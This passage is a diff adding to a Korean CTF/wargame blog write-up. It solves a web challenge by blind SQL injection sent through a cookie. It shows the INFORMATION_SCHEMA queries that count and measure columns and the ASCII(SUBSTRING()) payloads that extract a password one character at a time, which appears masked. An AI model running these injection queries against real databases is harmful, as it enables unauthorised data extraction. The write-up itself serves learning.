@@ -109,3 +109,51 @@ SELECT ASCII(SUBSTRING(TABLE_NAME, 1, 1)) FROM INFORMATION_SCHEMA.TABLES WHERE T
 * **Second Table Name = l - -**
 
 필자는 Intruder로 값을 확인했고, 스크립트로도 정확한 값이 나오는지 확인해보기 위해서 짰는데 값을 정확하게 나왔다. 스크립트는 [링크](https://github.com/peoplstar/peoplstar.github.io/blob/main/assets/python/Webhacking_2_Table_name.py)를 걸겠지만 직접 해보는 것을 추천한다.
+
+### 칼럼 개수
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/184472134-4d5916cb-7d8d-476a-aa66-babd190c8953.jpg" width = 560>
+</p>
+
+**ad-----------** 테이블에는 총 한개의 칼럼만 존재한다. 그렇다면 해당 칼럼의 이름의 글자수와 값을 테이블에서 했던 것과 같이 스크립트나 Intruder로 알아내면 문제 풀이는 끝날 것으로 보인다.
+
+### 칼럼 이름
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/184472134-4d5916cb-7d8d-476a-aa66-babd190c8953.jpg" width = 560>
+</p>
+
+```SQL
+(SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "ad-----------")
+
+(SELECT LENGTH(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "ad-----------")
+```
+
+칼럼 개수에서 이용한 SQL 문제에서 `COUNT`를 `LENGTH`로 바꾸면 칼럼의 글자 수는 두 자리인 것을 알 수 있다.
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/184473442-fb4c7ae7-e1a7-4791-8889-2a2b8edc9062.jpg" width = 560>
+</p>
+
+```SQL
+(SELECT LENGTH(column_name) FROM ad___________)
+```
+
+해당 칼럼의 데이터 길이는 17자리다.
+
+```SQL
+SELECT ASCII(SUBSTRING(column_name, 1, 1) FROM ad___________)
+```
+
+계속 1씩 증가하면서 똑같이 진행하면 패스워드가 나온다.
+
+* **패스워드 : **k u - - - - - - - - - - - - - - -**
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/184473746-5b2e0f89-5f52-46a2-93f5-b9eea8ae02fa.jpg" width = 350>
+</p>
+
+이번 문제는 쿠키를 통한 SQL 인젝션으로 문제 풀이 하는것이였다.
+
+SQL에 대해서 **information_schema**가 무엇인지 다시 한번 알게 되고, 모두가 한번씩 직접 스크립트를 짜보면서 해보는 것을 추천한다.
